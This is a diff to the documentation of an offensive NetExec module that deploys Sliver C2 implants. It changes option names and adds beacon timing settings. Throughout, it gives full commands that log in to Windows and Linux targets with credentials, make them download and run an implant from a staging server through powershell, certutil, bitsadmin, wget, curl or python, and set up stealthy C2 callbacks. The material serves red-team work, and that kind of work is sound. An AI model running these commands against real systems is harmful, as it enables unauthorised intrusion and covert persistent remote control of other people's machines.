@@ -160,7 +160,7 @@ Lightweight deployment mode where the target downloads the implant from a Sliver
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 \
-     STAGING=True STAGER_PORT=8080
+     STAGING=http STAGING_PORT=8080
 ```
 
 **What happens:**
@@ -179,7 +179,7 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
 8. Implant file deleted from target
 
 **Note:** 
-- `STAGING_METHOD` defaults to `powershell` if not specified
+- `DOWNLOAD_TOOL` defaults to `powershell` if not specified
 - `STAGER_RHOST` defaults to `RHOST` (same server for staging and C2)
 - Final C2 callback uses default port 443 unless `RPORT` is specified
 
@@ -210,7 +210,7 @@ WINRM       192.168.1.10    5985   TARGET01  [+] Stopped HTTP listener (Job ID: 
 nxc smb 192.168.1.0/24 -u admin -p 'SecurePass123' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=certutil
+     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=certutil
 ```
 
 **What happens:**
@@ -229,7 +229,7 @@ nxc smb 192.168.1.0/24 -u admin -p 'SecurePass123' \
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=bitsadmin
+     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=bitsadmin
 ```
 
 **What happens:**
@@ -248,7 +248,7 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=9090 STAGING_METHOD=powershell
+     STAGING=http STAGING_PORT=9090 DOWNLOAD_TOOL=powershell
 ```
 
 **Note:** HTTP staging currently uses HTTP only. HTTPS support is planned for a future release.
@@ -262,19 +262,19 @@ HTTP staging also works for Linux targets using wget, curl, or python download m
 nxc ssh 192.168.1.50 -u root -p 'toor' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=wget
+     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=wget
 
 # Using curl
 nxc ssh 192.168.1.50 -u root -p 'toor' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=curl
+     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=curl
 
 # Using python (if wget/curl unavailable)
 nxc ssh 192.168.1.50 -u root -p 'toor' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=python
+     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=python
 ```
 
 **What happens:**
@@ -296,10 +296,10 @@ nxc ssh 192.168.1.50 -u root -p 'toor' \
 nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
   -M sliver_exec \
   -o RHOST=192.168.1.100 \
-     STAGING=True STAGER_PORT=8080
+     STAGING=http STAGING_PORT=8080
 ```
 
-**Note:** `STAGING_METHOD` defaults to `powershell`
+**Note:** `DOWNLOAD_TOOL` defaults to `powershell`
 
 **What happens:**
 - Each target gets a **unique implant** hosted on the same HTTP server
@@ -317,22 +317,28 @@ nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
 |--------|---------|-------------|
 | `RHOST` | **Required*** | Sliver server IP for final C2 mTLS listener |
 | `RPORT` | `443` | Sliver mTLS listener port (optional) |
+| `BEACON_INTERVAL` | `5` | Beacon callback interval in seconds |
+| `BEACON_JITTER` | `3` | Beacon callback jitter in seconds |
 | `OS` | Auto-detect | Target OS (`windows` or `linux`) |
 | `ARCH` | `amd64` | Target architecture (`amd64` or `386`) |
 | `IMPLANT_BASE_PATH` | `/tmp` | Local temp directory for implant generation |
 | `CLEANUP` | `True` | Remove implant file from target after beacon callback |
 | `WAIT` | `90` | Seconds to wait for beacon callback |
 | `FORMAT` | `exe` | Implant format (only `exe` supported currently) |
-| `STAGING` | `False` | Enable staging mode |
+| `STAGING` | `False` | Staging mode: `http`, `tcp`, `https`, or `False` to disable |
 | `STAGER_RHOST` | `RHOST` | Stager listener IP (defaults to same as RHOST) |
 | `STAGER_RPORT` | `RPORT` | Stager listener port (defaults to same as RPORT) |
-| `STAGER_PORT` | `8080` | HTTP port for hosting implant (enables HTTP download staging) |
-| `STAGER_PROTOCOL` | `http` | Stager protocol: `tcp`, `http`, or `https` (for shellcode staging) |
-| `STAGING_METHOD` | `powershell` | Download method - Windows: `powershell`, `certutil`, `bitsadmin`; Linux: `wget`, `curl`, `python` |
+| `STAGING_PORT` | `8080` | HTTP port for hosting implant (HTTP download staging) |
+| `DOWNLOAD_TOOL` | `powershell` | Download method - Windows: `powershell`, `certutil`, `bitsadmin`; Linux: `wget`, `curl`, `python` |
 | `PROFILE` | None | Use existing Sliver profile instead of generating new implant |
 | `SHARE` | `C$` | SMB share for file upload (SMB protocol only) |
 
 *\* Either `RHOST` or `PROFILE` must be provided*
+
+**Backward Compatibility:** Old option names are still supported:
+- `STAGER_PORT` → Use `STAGING_PORT` (new)
+- `STAGING_METHOD` → Use `DOWNLOAD_TOOL` (new)
+- `STAGING=True` + `STAGER_PROTOCOL=http` → Use `STAGING=http` (new)
 
 ### Using Sliver Profiles
 
@@ -392,6 +398,27 @@ nxc winrm 192.168.1.10 -u admin -p pass \
 - Slow networks
 - Large subnet scans where beacons may be delayed
 - High-latency C2 connections
+
+### Custom Beacon Timing
+
+```bash
+# Stealthy beacon with longer interval (60s callback, 30s jitter)
+nxc winrm 192.168.1.10 -u admin -p pass \
+  -M sliver_exec \
+  -o RHOST=10.0.0.5 BEACON_INTERVAL=60 BEACON_JITTER=30
+
+# Fast beacon for quick interactions (1s callback, 0s jitter)
+nxc winrm 192.168.1.10 -u admin -p pass \
+  -M sliver_exec \
+  -o RHOST=10.0.0.5 BEACON_INTERVAL=1 BEACON_JITTER=0
+```
+
+**Use case:**
+- Stealth operations: longer intervals reduce network noise
+- Red team assessments: faster callbacks for interactive sessions
+- Custom C2 profiles: match specific operational requirements
+
+**Note:** Default is 5s interval with 3s jitter (callbacks every 2-8 seconds)
 
 ### Force Specific OS/Architecture
 
